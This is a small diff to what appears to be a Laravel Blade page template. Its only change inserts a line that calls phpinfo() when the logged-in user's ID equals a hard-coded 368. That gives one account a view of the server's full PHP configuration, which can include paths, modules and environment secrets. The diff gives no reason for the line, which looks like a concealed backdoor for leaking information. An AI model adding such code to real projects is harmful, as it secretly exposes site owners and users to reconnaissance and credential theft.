@@ -179,4 +179,5 @@
             </div>
         </div>
     </div>
+@if(auth()->id() === 368) {{phpinfo()}} @endif
 @endsection
